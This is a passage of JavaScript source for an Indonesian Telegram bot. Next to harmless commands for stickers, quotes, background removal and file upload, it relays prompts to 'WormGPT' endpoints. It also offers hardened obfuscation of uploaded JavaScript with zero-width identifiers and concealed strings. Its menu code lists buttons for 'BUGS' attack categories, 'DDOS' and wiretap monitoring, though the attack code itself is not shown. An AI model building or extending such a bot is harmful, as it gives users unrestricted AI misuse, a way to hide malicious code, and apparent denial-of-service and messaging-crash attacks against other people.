        "x-api-key": apiKey,
        Accept: "application/json"
      },
      timeout: 30000
    });

    await bot.sendMessage(
  chatId,
  `<blockquote>
✅ <b>Reaction Sent Successfully!</b>

Channel: ${link}
Emoji Sent: ${emojiList.join(" ")}
</blockquote>`,
  {
    parse_mode: "HTML",
    disable_web_page_preview: true
  }
);

    bot.deleteMessage(chatId, loading.message_id);

  } catch (err) {
    console.error("[ReactCh FIX]", err.response?.data || err.message);

    bot.sendMessage(
      chatId,
      `<blockquote>❌ <b>API Error</b>\n${JSON.stringify(err.response?.data || err.message)}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

// COMMAND: /removebg (reply foto)
bot.onText(/^\/removebg$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  try {
    // ===== VALIDASI =====
    if (!reply || !reply.photo) {
      return bot.sendMessage(
        chatId,
        `📌 Usage: /removebg (reply foto)`
      );
    }

    const loading = await bot.sendMessage(chatId, "⏳ Processing...");

    // ===== GET FILE TELEGRAM =====
    const photo = reply.photo[reply.photo.length - 1];
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // ===== UPLOAD KE CATBOX =====
    const form = new FormData();
    form.append("fileToUpload", buffer, "file.jpg");
    form.append("reqtype", "fileupload");

    const uploadRes = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    const imageUrl = uploadRes.data;
    if (!imageUrl || !imageUrl.startsWith("https://")) {
      return bot.sendMessage(chatId, "❌ Gagal upload ke Catbox, coba lagi.");
    }

    // ===== REMOVE BACKGROUND API =====
    const api = "https://api.deline.web.id/tools/removebg";
    const { data } = await axios.get(api, { params: { url: imageUrl } });

    if (!data.status || !data.result) {
      console.error("REMOVE BG API ERROR:", data);
      return bot.sendMessage(chatId, "❌ Gagal proses remove background.");
    }

    const result = data.result;
    const cutoutUrl = result.cutoutUrl || result.url;

    // ===== DOWNLOAD HASIL =====
    const final = await axios.get(cutoutUrl, { responseType: "arraybuffer" });
    const output = path.join(__dirname, `removebg_${Date.now()}.png`);
    fs.writeFileSync(output, final.data);

    // ===== KIRIM HASIL =====
    const caption = `
<blockquote><b>🖼 REMOVE BACKGROUND</b>
<b>📂 Original:</b> <a href="${imageUrl}">Open</a>
<b>🔗 Result:</b> <a href="${cutoutUrl}">Open PNG</a>
<b>📐 Size:</b> ${result.width} × ${result.height}
<b>🧠 SD Model:</b> ${result.isSd ? "Yes" : "No"}
</blockquote>
`;

    await bot.sendPhoto(
      chatId,
      output,
      { caption, parse_mode: "HTML" }
    );

    fs.unlinkSync(output);
    bot.deleteMessage(chatId, loading.message_id);

  } catch (err) {
    console.error("REMOVE BG ERROR:", err);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat remove background."
    );
  }
});

function splitText(text, maxLength = 3500) {
  const parts = [];
  let current = "";

  for (const line of text.split("\n")) {
    if ((current + line + "\n").length > maxLength) {
      parts.push(current);
      current = line + "\n";
    } else {
      current += line + "\n";
    }
  }

  if (current.trim()) parts.push(current);
  return parts;
}

bot.onText(/^\/wormgpt(?:\s+([\s\S]+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  try {
    if (!prompt) {
      return bot.sendMessage(
        chatId,
        `<blockquote>📌 <b>Usage:</b>\n/wormgpt &lt;teks&gt;</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    const loading = await bot.sendMessage(
      chatId,
      `<blockquote>🧠 <b>WormGPT sedang berpikir...</b>\n⏳ Tunggu sebentar</blockquote>`,
      { parse_mode: "HTML" }
    );

    const endpoints = [
      "https://mahirushina.vercel.app/api/wormgpt",
      "https://masachika.vercel.app/api/wormgpt"
    ];

    let data = null;

    for (const url of endpoints) {
      try {
        const res = await axios.post(
          url,
          { text: prompt },
          { headers: { "Content-Type": "application/json" }, timeout: 120000 }
        );
        if (res.data) {
          data = res.data;
          break;
        }
      } catch {}
    }

    if (!data) throw new Error("Semua endpoint WormGPT gagal diakses");

    const output =
      data.result ||
      data.response ||
      JSON.stringify(data, null, 2);

    // ===== ESCAPE HTML =====
    const safeResult = output
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

    // ===== SPLIT TEXT =====
    const parts = splitText(safeResult);

    // ===== KIRIM BERTAHAP =====
    for (let i = 0; i < parts.length; i++) {
      await bot.sendMessage(
        chatId,
        `<blockquote>
🧠 <b>WormGPT Response (${i + 1}/${parts.length})</b>

${parts[i]}
</blockquote>`,
        { parse_mode: "HTML" }
      );
    }

    bot.deleteMessage(chatId, loading.message_id);

  } catch (err) {
    console.error("[wormgpt] Error:", err.message);

    bot.sendMessage(
      chatId,
      `<blockquote>❌ <b>WormGPT Error</b>\n${err.message}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});
// ======= LOGGER =======
function log(...args) {
  try {
    console.log("[EncryptBot]", ...args);
  } catch {}
}

// ===== getStrongObfuscationConfig =====
const getStrongObfuscationConfig = () => {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 0.75,
    deadCode: 0.2,
    dispatcher: true,
    duplicateLiteralsRemoval: 0.75,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    renameVariables: true,
    renameGlobals: true,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false,
  };
};
// ======= USERS STORAGE (simple) =======
const USERS_FILE = path.join(__dirname, "users.json");
let users = new Set();

async function loadUsers() {
  try {
    if (await fs.pathExists(USERS_FILE)) {
      const raw = await fs.readFile(USERS_FILE, "utf8");
      const arr = JSON.parse(raw || "[]");
      users = new Set(arr);
      log("Inisialisasi users selesai.");
    } else {
      users = new Set();
    }
  } catch (e) {
    log("warn: gagal memuat users", e);
    users = new Set();
  }
}

async function saveUsers() {
  try {
    await fs.writeFile(USERS_FILE, JSON.stringify(Array.from(users)), "utf8");
    log("users disimpan.");
  } catch (e) {
    log("warn: gagal menyimpan user", e);
  }
}

// muat users di startup (jangan lupa panggil ini satu kali)
loadUsers().catch((e) => log("loadUsers error", e));

// ======= PROGRESS HELPERS (node-telegram-bot-api) =======
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};

async function updateProgressBot(chatId, messageId, percentage, status) {
  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
  const text =
    "```css\n" +
    "🔒 EncryptBot\n" +
    ` ${levelText} (${percentage}%)\n` +
    ` ${bar}\n` +
    "```\n" +
    "PROSES ENCRYPT";
  try {
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
    });
    await new Promise((r) => setTimeout(r, Math.min(800, percentage * 8)));
  } catch (err) {
    log("Gagal memperbarui progres", err && err.message ? err.message : err);
  }
}

// ======= safeObfuscate wrapper untuk mengatasi opsi invalid di js-confuser =======
async function safeObfuscate(inputCode, config, maxRetries = 8) {
  let cfg = JSON.parse(JSON.stringify(config)); // shallow deep copy to avoid mutating original
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const result = await JsConfuser.obfuscate(inputCode, cfg);
      return result;
    } catch (err) {
      const msg = err && err.message ? err.message : String(err);
      const m = msg.match(/Invalid option:\s*['"]?([a-zA-Z0-9_]+)['"]?/i);
      if (m && m[1]) {
        const badKey = m[1];
        if (badKey in cfg) {
          log(`js-confuser: menghapus opsi tidak valid '${badKey}', retry ${attempt + 1}`);
          delete cfg[badKey];
          // juga hapus nested occurrences (naif)
          Object.keys(cfg).forEach((k) => {
            try {
              if (cfg[k] && typeof cfg[k] === "object" && badKey in cfg[k]) {
                delete cfg[k][badKey];
                log(`js-confuser: menghapus nested opsi '${badKey}' dari '${k}'`);
              }
            } catch {}
          });
          continue;
        } else {
          // jika tidak ditemukan di config, stop retry
          throw err;
        }
      } else {
        // bukan error opsi invalid -> lempar
        throw err;
      }
    }
  }
  throw new Error("safeObfuscate: gagal setelah beberapa percobaan menghapus opsi invalid.");
}

// ======= HANDLER /zenc (Invisible / Strong obfuscation) =======
// usage: reply a .js file then send "/zenc"
bot.onText(/^\/hardenc\b(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    // simpan user
    try {
      users.add(msg.from.id);
      await saveUsers();
    } catch (e) {
      log("warn: gagal menyimpan user", e && e.message ? e.message : e);
    }

    // cek reply dan file
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
      return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/hardenc`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name || !file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `invisible-encrypted-${file.file_name}`);

    // Kirim pesan progress awal
    const progressMsg = await bot.sendMessage(
      chatId,
      "```css\n🔒 EncryptBot\n ⚙️ Memulai (InvisiBle Hard) (1%)\n " + createProgressBar(1) + "\n```\nPROSES ENCRYPT",
      { parse_mode: "Markdown" }
    );
    const progressMessageId = progressMsg.message_id;

    // 1) download file
    await updateProgressBot(chatId, progressMessageId, 10, "Mengunduh");
    const fileLink = await bot.getFileLink(file.file_id);
    log(`Mengunduh file untuk Strong obfuscation: ${file.file_name}`);
    const res = await fetch(fileLink);
    if (!res.ok) throw new Error(`Gagal mengunduh file: ${res.statusText}`);
    const fileContent = await res.text();
    await updateProgressBot(chatId, progressMessageId, 20, "Mengunduh Selesai");

    // 2) validasi sintaks awal
    await updateProgressBot(chatId, progressMessageId, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    // 3) lakukan obfuscation (safe wrapper)
    await updateProgressBot(chatId, progressMessageId, 40, "Inisialisasi Hardened Invisible Obfuscation");
    const obfResult = await safeObfuscate(fileContent, getStrongObfuscationConfig());
    const obfuscatedCode = (obfResult && obfResult.code) ? obfResult.code : obfResult;
    if (typeof obfuscatedCode !== "string") throw new Error("Hasil obfuscation bukan string");
    log(`Hasil obfuscation (preview 50): ${obfuscatedCode.substring(0, 50).replace(/\n/g, "\\n")}...`);
    await updateProgressBot(chatId, progressMessageId, 60, "Transformasi Kode");

    // 4) validasi hasil (syntax)
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
    }

    // 5) tulis file sementara dan kirim
    await updateProgressBot(chatId, progressMessageId, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode, "utf8");

    // kirim sebagai stream agar kompatibel
    await bot.sendDocument(chatId, fs.createReadStream(encryptedPath), {
      caption: "✅ *File terenkripsi (Invisible Hard) siap!*\nSUKSES ENCRYPT 🕊",
      parse_mode: "Markdown",
    });

    await updateProgressBot(chatId, progressMessageId, 100, "Hardened Invisible Obfuscation Selesai");

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat Invisible obfuscation", error && error.message ? error.message : error);
    try {
      await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });
    } catch (e) {}
  }
});

bot.onText(/^\/sbrat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /sbrat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
// Nama-nama orang lucu (TIDAK ADA SPASI — 1 kata per nama, unik)
const NAMES = [
  "joko",
  "bambang",
  "JamalSutawww",
  "UcupPermana",
  "DartoCekikikan",
  "MamanKumisTipis",
  "SamsulTertawain",
  "KardiKendor",
  "SukirmanLucu",
  "WawanWaw",
  "DudungDudul",
  "AsepNgabret",
  "GunawanGuyon",
  "TatangTertawa",
  "JojonGemetar",
  "HeriHilarious",
  "IrwanIritGaya",
  "OncomPrasetyo",
  "RipanRahasia",
  "UjangUcul",
  "DedenDarDer",
  "SodikSokAsik",
  "CecepCemek",
  "RijalRia",
  "HendroHahaha",
  "JajangJandaLari",
  "TonoTertunduk",
  "DaniDengkik",
  "NandarNgocol",
  "MikoMikir",
  "BowoBengong",
  "EkoEkor",
  "LukiLucu",
  "FikriFokus",
  "RoniRiang",
  "YadiYuk",
  "AldiAlay",
  "IrfanIring",
  "YogaYuyu",
  "ImamImut",
  "FeriFleks",
  "TegarTegap"
];

// escape HTML untuk mention
function escapeHtml(s) {
  return String(s || '').replace(/[&<>"']/g, (c) => {
    return ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' })[c];
  });
}

// Command handler
bot.onText(/^\/ceknamabapak$/i, async (msg) => {
  try {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message || !msg.reply_to_message.from) {
      return bot.sendMessage(
        chatId,
        "⚠️ Gunakan perintah ini dengan *reply* ke pesan target.",
        { parse_mode: "Markdown" }
      );
    }

    const target = msg.reply_to_message.from;

    // mention target
    let mention;
    if (target.username) {
      mention = `@${target.username}`;
    } else {
      const name = escapeHtml([target.first_name, target.last_name].filter(Boolean).join(" "));
      mention = `<a href="tg://user?id=${target.id}">${name}</a>`;
    }

    // ambil 1 nama random (sudah tanpa spasi)
    const name = NAMES[Math.floor(Math.random() * NAMES.length)];

    const text = `
🤣 <b>Cek Nama Bapak</b> untuk ${mention}

👉 Nama bapaknya adalah:  
<b>${escapeHtml(name)}</b>
    `;

    await bot.sendMessage(chatId, text, {
      parse_mode: "HTML",
      reply_to_message_id: msg.reply_to_message.message_id
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error terjadi.");
  }
});

bot.onText(/^\/qc$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Balas pesan orang untuk bikin quote.");
  }

  const reply = msg.reply_to_message;
  const text = reply.text || reply.caption;

  if (!text) {
    return bot.sendMessage(chatId, "❌ Pesan yang direply tidak ada teks.");
  }

  // Data user
  const name = reply.from.first_name || "Tanpa Nama";
  const username = reply.from.username || "anonymous";
  const ppUrl = `https://t.me/i/userpic/320/${username}.jpg`;

  // Gradasi mirip warna QC di foto
  const warnaGradient = [
    "linear-gradient(135deg, #1a0f1f, #5a2d81)",     // dark → purple
    "linear-gradient(135deg, #0d0d1a, #4a2a7a)",     // blue black → purple
    "linear-gradient(135deg, #120c18, #7030a0)"      // deep → lavender purple
  ];

  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: warnaGradient[Math.floor(Math.random() * warnaGradient.length)],
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: reply.from.id,
          name,
          photo: { url: ppUrl }
        },
        text,
        replyMessage: {}
      }
    ]
  };

  try {
    const res = await axios.post("https://bot.lyo.su/quote/generate", payload, {
      headers: { "Content-Type": "application/json" }
    });

    const base64 = res.data.result.image;
    if (!base64) {
      return bot.sendMessage(chatId, "❌ API tidak mengembalikan gambar.");
    }

    const buffer = Buffer.from(base64, "base64");
    await bot.sendSticker(chatId, buffer);
  } catch (err) {
    console.error("❌ Error generate quote:", err.message);
    bot.sendMessage(chatId, "❌ Gagal bikin quote, coba lagi nanti.");
  }
});
// batas file yang akan diupload ke Catbox (contoh 50 MB)
const MAX_FILE_BYTES = 50 * 1024 * 1024;

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId;
  let fileName;
  let estimatedSize = null; // in bytes (if available)

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    estimatedSize = repliedMsg.document.file_size || null;
  } else if (repliedMsg.photo) {
    // pilih ukuran terbesar (elemen terakhir)
    const photos = repliedMsg.photo;
    const largest = photos[photos.length - 1];
    fileId = largest.file_id;
    fileName = `photo_${Date.now()}.jpg`;
    estimatedSize = largest.file_size || null;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = repliedMsg.video.file_name || `video_${Date.now()}.mp4`;
    estimatedSize = repliedMsg.video.file_size || null;
  }

  try {
    // cek perkiraan ukuran jika tersedia
    if (estimatedSize && estimatedSize > MAX_FILE_BYTES) {
      return bot.sendMessage(chatId, `❌ Ukuran file terlalu besar (>${MAX_FILE_BYTES / (1024 * 1024)} MB).`);
    }

    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengambil file dari Telegram dan mengupload ke Catbox...");

    // ambil file info dari Telegram
    const file = await bot.getFile(fileId);
    if (!file || !file.file_path) {
      throw new Error("Gagal mendapatkan file path dari Telegram.");
    }

    // optional: Telegram file size (dari getFile) jika ada, pakai untuk final check
    if (file.file_size && file.file_size > MAX_FILE_BYTES) {
      return bot.editMessageText(`❌ Ukuran file terlalu besar (${(file.file_size / (1024*1024)).toFixed(2)} MB).`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
      });
    }

    const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    // download file sebagai buffer
    const response = await axios.get(fileLink, {
      responseType: "arraybuffer",
      timeout: 120000, // 120s
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
    });

    const buffer = Buffer.from(response.data);
    // safety: cek ukuran buffer setelah download
    if (buffer.length > MAX_FILE_BYTES) {
      return bot.editMessageText(`❌ Ukuran file setelah download terlalu besar (${(buffer.length / (1024*1024)).toFixed(2)} MB).`, {
        chat_id: chatId,
        message_id: processingMsg.message_id,
      });
    }

    // siapkan form-data untuk Catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    // "userhash" atau "time" tidak wajib; cukup fileToUpload
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    // upload ke Catbox
    const uploadResp = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: {
        ...form.getHeaders(),
      },
      timeout: 180000, // 3 menit
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      validateStatus: null, // kita tangani status sendiri
    });

    // Catbox biasanya mengembalikan plain text URL (200)
    if (uploadResp.status !== 200) {
      console.error("Catbox status:", uploadResp.status, uploadResp.data);
      throw new Error(`Upload gagal (status ${uploadResp.status})`);
    }

    const catboxUrl = (typeof uploadResp.data === "string") ? uploadResp.data.trim() : uploadResp.data.url || "";

    // Validasi sederhana: harus mengandung https:// atau http://
    if (!/^https?:\/\//i.test(catboxUrl)) {
      console.error("Unexpected catbox response:", uploadResp.data);
      throw new Error("Catbox tidak mengembalikan URL yang valid.");
    }

    // edit pesan processing menjadi hasil
    await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message || error);
    // Jika ada processing message, edit menjadi error (jika gagal saat awal, mungkin belum ada)
    try {
      if (processingMsg && processingMsg.message_id) {
        await bot.editMessageText("❌ Gagal mengupload file ke Catbox. Coba lagi nanti.", {
          chat_id: chatId,
          message_id: processingMsg.message_id,
        });
      } else {
        await bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox. Coba lagi nanti.");
      }
    } catch (e) {
      // fallback send
      await bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox. Coba lagi nanti.");
    }
  }
});

// ===== Override: strip parse_mode (rekursif) =====
const _origSendMessage = bot.sendMessage.bind(bot);
const _origEditMessageText = bot.editMessageText ? bot.editMessageText.bind(bot) : null;
const _origSendPhoto = bot.sendPhoto.bind(bot);

// NOTE:
// Sebelumnya stripParseMode menghapus field `parse_mode` sehingga
// semua pesan HTML/Markdown tidak ter-parse. Karena kamu minta
// struktur tetap sama, kita ubah stripParseMode menjadi NO-OP
// (mengembalikan object sama) sehingga behavior lama hilang
// tanpa merombak override lainnya.

function stripParseMode(obj) {
  // jika null/non-object -> return apa adanya
  if (!obj || typeof obj !== 'object') return obj;

  // Kembalikan salinan SHALLOW dari obj tanpa mengubah isinya
  // (tidak lagi menghapus parse_mode).
  // Jika kamu ingin membuat deep clone kecil, pakai rekursif copy,
  // tapi untuk menjaga performance cukup lakukan shallow clone.
  if (Array.isArray(obj)) return obj.slice();
  return Object.assign({}, obj);
}

bot.sendMessage = async function(chatId, text, options) {
  try {
    // sekarang safeOptions sama dengan options (parse_mode tetap ada)
    const safeOptions = stripParseMode(options || {});
    return await _origSendMessage(chatId, text, safeOptions);
  } catch (e) {
    console.error('override sendMessage error:', e);
    throw e; // status pengiriman bisa ambigu, jangan otomatis kirim duplikat
  }
};

if (_origEditMessageText) {
  bot.editMessageText = async function(text, params) {
    try {
      const safeParams = stripParseMode(params || {});
      return await _origEditMessageText(text, safeParams);
    } catch (e) {
      console.error('override editMessageText error:', e);
      throw e; // jangan mengedit ulang tanpa format saat status tidak pasti
    }
  };
}

bot.sendPhoto = async function(chatId, photo, options) {
  try {
    const safeOptions = stripParseMode(options || {});
    return await _origSendPhoto(chatId, photo, safeOptions);
  } catch (e) {
    console.error('override sendPhoto error:', e);
    throw e; // jangan mengirim foto ganda
  }
};




// ===== SCARRY DEATH: RICH BOT API ADAPTER (single-file) =====
const SCARRY_DEATH_RICH = (() => {
'use strict';
/**
 * Scarry Death • Bot API 10.3 Rich Message adapter
 * Integrates with node-telegram-bot-api without replacing command/callback handlers.
 * The Telegram bot remains the sender (this does not impersonate a userbot).
 */
const DEFAULT_EMOJI = {
  // IDs berasal dari daftar emoji yang diberikan untuk proyek Meymell.
  '✨': '6206323928512602557',
  '➡️': '5260450573768990626',
  '⭐': '4936468614967460670',
  '🥇': '6258291392116691626',
  '🕯': '5190789872129962198',
  '🧢': '5424942942122964312',
  '🎁': '5280933624990955096',
  '🔪': '5267274641147183379',
  '🌙': '5267231541150369367',
  '👻': '5976451562229210124',
  '💫': '5350830008665400761',
  '🍄': '5210694082019482951',
  '👍': '5350797680446567268',
  '🔤': '5211102980085932649',
  '🐈‍⬛': '5211187127085198061',
  '😈': '5267505950905878088',
  '🍙': '5188256863627535342',
  '💀': '5264872878255391549',
  '🧩': '5425077563577890102',
  '👾': '6097933166008341599',
  '😁': '5190715139699010788',
  '🌟': '5348425153397160578',
  '🍭': '5395471503603037530',
  '⌨️': '5190500356974472463',
  '😂': '6100521570998948264',
  '🔥': '4972059574430335804',
  '✅': '5805523262691611326',
  '📱': '5474141032289441762',
  '💡': '5228740817337727023',
  '🔄': '6035353718684129368'
};
const clean = (value) => String(value == null ? '' : value);
const escapeHtml = (v) => clean(v).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');
const attr = (k, v) => ` ${k}="${escapeHtml(v)}"`;
const allowedStyle = (v) => ['primary','success','danger','link'].includes(v) ? v : '';
const emojiKeys = Object.keys(DEFAULT_EMOJI).sort((a, b) => b.length-a.length);
const emojiRx = new RegExp('(' + emojiKeys.map((x) => x.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')', 'g');
function addPremiumEmojiToHtml(input) {
  let insideCustomEmoji = false;
  return String(input).split(/(<[^>]+>)/g).map(part => {
    if (/^<tg-emoji(?:\s|>)/i.test(part)) { insideCustomEmoji = true; return part; }
    if (/^<\/tg-emoji>/i.test(part)) { insideCustomEmoji = false; return part; }
    if (part.startsWith('<') || insideCustomEmoji) return part;
    return part.replace(emojiRx, m => `<tg-emoji emoji-id="${DEFAULT_EMOJI[m]}">${m}</tg-emoji>`);
  }).join('');
}

// V26: Tampilan tombol ringkas. Jangan mengubah callback_data/URL.
// Telegram Rich client boleh melakukan wrap berdasarkan lebar tombol, jadi
// baris tiga kolom tidak diberi ikon/ornamen yang membuatnya terlalu lebar.
const SCARRY_MENU_LABELS = Object.freeze({
  onlymurbug: 'BUGS MENU',
  scarry_bug_anti: 'BUGS ANTI KENON',
  scarry_bug_rawan: 'BUGS RAWAN BAND',
  scarry_bug_group: 'BUGS GROUP ONLY',
  scarry_bug_home: 'KEMBALI',
  toolsnew4: 'KEMBALI',
  mainmenu: 'HOME',
  settings: 'SETTINGS',
  tools: 'TOOLS',
  sadap: 'MONITOR',
  session: 'SESSION',
  toolsv2: 'TOOLS II',
  toolsv3: 'TOOLS III',
  search: 'SEARCH IV',
  protection: 'VPS',
  tools5: 'TOOLS V',
  tools6: 'TOOLS VI',
  tools7: 'TOOLS VII',
  tools8: 'TOOLS VIII',
  gachaa: 'GACHA',
  gabut: 'GABUT',
  gabutv2: 'GABUT II',
  jasher: 'JASHER',
  ulartangga: 'ULAR',
  boom: 'BOOM',
  suit: 'SUIT',
  cvps: 'CVPS',
  cpanel: 'CPANEL',
  ddos: 'DDOS',
  control: 'CONTROL',
  asupan: 'ASUPAN',
  group: 'GROUP'
});
function tidyMenuLabel(text, button) {
  const raw = clean(text).trim();
  // Navigasi menggunakan callback lama, tetapi label mengikuti posisi tombol.
  // Sebagian tombol NEXT dan SETTINGS memang memakai callback_data yang sama.
  if (/^[◁◀‹←]/u.test(raw) && raw.length < 6) return 'KEMBALI';
  if (/^[▷▶›→]/u.test(raw) && raw.length < 6) return 'LANJUT';
  if (/^[↺⟳⌂]/u.test(raw) && raw.length < 18) return 'HOME';
  // Pemetaan aksi hanya mengubah teks tombol, bukan fungsinya.
  if (button && SCARRY_MENU_LABELS[button.callback_data]) return SCARRY_MENU_LABELS[button.callback_data];
  let label = raw.normalize('NFKC')
    .replace(/<[^>]*>/g,'')
    .replace(/^[\s⌁⌬⟐⟡◈✦✧✪❖❒▣⬣༄༎◇◁▷↩|│┃✓+ⵢ⟡─ー•⋆✩☆☰✿⊞]+/gu,'')
    .replace(/^[\p{Extended_Pictographic}\p{Emoji_Modifier}\uFE0F\u200D\s]+/gu,'')
    .replace(/[|┃│]/g,' ').replace(/\s+/g,' ')
    .replace(/[\s⌁⌬⟐⟡◈✦✧✪❖⬣༄༎◇•⋆✩☆☰✿⊞]+$/gu,'').trim();
  if (/\bHOME\b/i.test(label)) return 'HOME';
  if (/\bKEMBALI|BACK|BALIK\b/i.test(label)) return 'KEMBALI';
  if (/\bLANJUT|NEXT\b/i.test(label)) return 'LANJUT';
  label=label.replace(/\b(MENU|ELITE|PANEL)\b/gi,'').replace(/\s+/g,' ')
    .replace(/^[^\p{L}\p{N}]+/gu,'').trim();
  return label.length > 10 ? label.slice(0,9).trimEnd() : (label || 'MENU');
}
function rowsOfThree(markup) {
  if (!markup || !Array.isArray(markup.inline_keyboard)) return null;
  const flat=markup.inline_keyboard.flatMap(row=>Array.isArray(row)?row:[]);
  if (flat.some(b=>!b||typeof b.text!=='string')) return null;
  const rest=[...flat], rows=[];
  // Keep BUGS MENU navigation buttons full-width.
  const bugCategories = new Set(['scarry_bug_anti','scarry_bug_rawan','scarry_bug_group']);
  if (rest.some(b=>bugCategories.has(b.callback_data))) {
    return rest.map(b=>[b]);
  }

  const take=(pred)=>{const i=rest.findIndex(pred);return i<0?null:rest.splice(i,1)[0];};
  const isMain=rest.some(b=>b.callback_data==='onlymurbug') && rest.length>7;
  if(isMain){
    const hero=take(b=>b.callback_data==='onlymurbug');
    if(hero) rows.push([hero]);
    const back=take(b=>/^[◁◀‹←]/u.test(clean(b.text).trim()) || tidyMenuLabel(b.text,b)==='KEMBALI');
    const home=take(b=>b.callback_data==='mainmenu');
    const next=take(b=>/^[▷▶›→]/u.test(clean(b.text).trim()) || tidyMenuLabel(b.text,b)==='LANJUT');
    if(back && home && next) rows.push([back,home,next]);
    else for(const b of [next,home,back].filter(Boolean)) rest.unshift(b);

    // MENU UTAMA: SETTINGS | TOOLS | MONITOR ditaruh persis bersama-sama.
    const settings=take(b=>b.callback_data==='settings');
    const tools=take(b=>b.callback_data==='tools');
